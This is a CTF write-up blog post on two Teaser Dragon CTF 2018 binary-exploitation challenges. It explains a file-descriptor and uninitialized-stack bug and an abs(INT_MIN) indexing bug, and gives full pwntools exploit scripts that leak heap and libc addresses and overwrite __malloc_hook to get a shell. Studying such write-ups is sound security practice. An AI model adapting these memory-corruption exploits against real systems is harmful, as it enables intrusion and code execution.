---
title:        "Teaser Dragon CTF 2018"

# jekyll-seo-tag

author:       "Ne0"

---


## Teaser Dragon CTF 2018

Hi, I am [Ne0](https://github.com/Changochen). Last weekend I played Teaser Dragon CTF as a member of r3kapig. This is my first time to play a CTF held by `DragonSector` and I really enjoyed the challenges. By the way, we luckily made it to the final.

### Production

I didn't solve this challenge during the CTF, but it worths taking a note for it. 

The key point is : the `assert` are removed in the remote binary....

Which means...

```cpp
249 : assert(close(globals::records[idx]) == 0);
282 : assert(bytes_read == length);
```

don' t exist in the remote binary.

So how do we get the flag?

1. bypass the path check:
2. open 16 `./data/../lyrics` and read them until the `DrgnS` in the binary is read. Then the `record` pop them out with the files unclosed.
3. open 12 arbitrary file , like `./data/The Beatles/Girl` 
4. Now the `fd` number is `31`, because we still have `stdin`,`stdout` and `stderr`!
5. open `./data/../flag`
6. bypass `DrgnS` check:
7. read the `./data/The Beatles/Girl` so many times that no contents are left
8. read `flag`
9. read `./data/The Beatles/Girl` again, as the stack is uninitialized , we get the flag!



#### Final Exploit:

```python
from pwn import *

remote_addr=['lyrics.hackable.software',4141]
#context.log_level=True

p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def cmd(command):
    sla("> ",command)

def bands():
    cmd("bands")

def songs(band):
    cmd("songs")
    sla("Band: ",band)

def _open(band,song):
    cmd("open")
    sla("Band: ",band)
    sla("Song: ",song)

def _read(idx):
    cmd("read")
    sla("ID: ",str(idx))

def _write(idx,content):
    cmd("write")
    sla("ID: ",str(idx))
    sla("length: ",str(len(content)+1))
    sa(": ",content)

def _close(idx):
    cmd("close")
    sla("ID: ",str(idx))

if __name__ == '__main__':
    for i in xrange(16):
        _open("..",'lyrics')

    for i in xrange(16):
        for j in xrange(24):
            _read(0)
    
    for i in xrange(12):
        _open('The Beatles','Girl')

    _open("..",'flag')
    for i in xrange(31):
        _read(0)
    _read(12)
    _read(0)
    p.interactive()
```



### Fast Storage

This challenge is also interesting. The only bug is in the `abs`

```cpp
  v2 = hash1(name);
  v3 = hash2((unsigned __int8 *)name);
  v4 = hash3(name);
  idx = abs(v2) % 62;
  add_entries(idx, name, value);
  return add_bitmaps(idx, v3, v4);
```



Do you know that .... `abs(0x80000000)=0x80000000`?

Boom!

So if `hash` return `0x80000000`, then we will get a negative `idx=-2`, and the `bitmaps` array and the `entries` array will overlap. 

Which means we can use `bitmaps` to change `entries[-2]` to whatever we want. But we need to leak first...How?

In the `find_by_name` function

```cpp
char *__fastcall find_by_name(unsigned __int8 *a1)
{
  int v1; // ST24_4
  char v2; // ST20_1
  char v3; // al
  int v5; // [rsp+24h] [rbp-Ch]
  struct Entry *i; // [rsp+28h] [rbp-8h]

  v1 = hash1((char *)a1);
  v2 = hash2(a1);
  v3 = hash3(a1);
  v5 = abs(v1) % 62;
  if ( !(unsigned int)check(v5, v2, v3) )
    return 0LL;
  for ( i = entries[v5]; i && strcmp(i->name, (const char *)a1); i = i->next )
    ;
  return i->value;
```

There is a check to see whether certain bits are set in the `bitmap`. Oh, then we can leak the content in `bitmaps[60:62]` which is `entries[-2]` bit by bit! 

With all these , the exploitation is easy as solving a web challenge.

I use `z3` to help find the needed `name`



#### Final Exploit:

`z3 helperscript: more.py`：

```python
#!/usr/bin/env python
# coding=utf-8
from z3 import *
import sys
s = Solver()
a = BitVec("a", 32)
b = BitVec("b", 32)
c = BitVec("c", 32)
d = BitVec("d", 32)
e = BitVec("e", 32)
f = BitVec("f", 32)

g = BitVec("g", 32)
h = BitVec("h", 32)

i = BitVec("i", 32)

i=(((((0x1337*a+1)*b+1)*c+1)*d+1)*g+1)*h+1
s.add(a<256,b<256,c<256,d<256,g<256,h<256,i<=0x7eFFFFFF)
s.add(a>0,b>0,c>0,d>0,g>0,h>0,i>0)

tmp=int(sys.argv[1])
if(tmp>=32):
    s.add(i%62==61)
    tmp-=32
else:
    s.add((i+2)%62==0)

e=((b<<8)+a)^((d<<8)+c)^((h<<8)+g)
s.add((((e >> 10) ^((e ^ (e >> 5))&0xFF))&0x1f)==tmp)
f=0
for w in range(8):
    f=f+((a>>w)&0x1)
    f=f+((b>>w)&0x1)
    f=f+((c>>w)&0x1)
    f=f+((d>>w)&0x1)
    f=f+((g>>w)&0x1)
    f=f+((h>>w)&0x1)

s.add((f&0x1f)==tmp)

if(s.check()):
    m=s.model()
    print(m[a]+m[b]+m[c]+m[d]+m[g]+m[h])
```

Exp:

```python
from pwn import *
import os
local=0
pc='./faststorage'
pc='/tmp/pwn/faststorage_debug'
remote_addr=['faststorage.hackable.software',1337]
aslr=False
#context.log_level=True
libc=ELF('./libc.so.6')

if local==1:
    p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    #p = process(pc,aslr=aslr)
    gdb.attach(p,'c')
else:
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla("> ",str(idx))

def add_entry(name,size,value):
    choice(1)
    sa(":",name)
    sla(":",str(size))
    sa(":",value)

def edit_entry(name,value):
    choice(3)
    sa(":",name)
    sa(":",value)

def print_entry(name):
    choice(2)
    sa(":",name)

def getcheck(idx):
    res=''
    payloads=os.popen("python more.py "+str(idx)).read().strip('\n')
    payloads=payloads.split(' + ')
    for i in payloads:
        res+=p8(int(i))
    return res

if __name__ == '__main__':
    thename='\xa1\xf8\xe6\xa9'
    a=[]
    for i in range(32):
        a.append(getcheck(12+i))
        add_entry(a[i],0x10,'123')
    add_entry(thename,0x10,'fuckme')
    res=0
    for i in range(32):
        print_entry(a[i])
        if "No such entry!" in rl():
            continue
        res+=1<<(12+i)
    heap_addr=res+0x500000000000
    lg("heap addr",heap_addr)
    pl=p64(0)*1+p64(heap_addr+0xc30)+p64(heap_addr+0xd38+(0x1000<<47))
    add_entry(getcheck(5),0x80,pl)
    edit_entry(thename,p64(0x2d1))
    add_entry('1234',0x300,'1234')
    print_entry(thename)
    ru("Value: ")
    rv(16)
    libc_addr=raddr()-0x3c4e18
    lg("libc_addr",libc_addr)
    libc.address=libc_addr 
    pl=p64(0x21)+'1234\x00\x00\x00\x00'+p64(0)*4+p64(heap_addr+0xd40)+p64(libc.symbols['__malloc_hook']+(0x8<<48))
    edit_entry(thename,pl)
    edit_entry('1234',p64(libc.address+0xf1147))
    p.interactive()
```



### Conclusion

If you have any other ways to solve these challenges, please share with me . Again , if you like this writeup, please follow me on [Github](https://github.com/Changochen). Have a nice day!








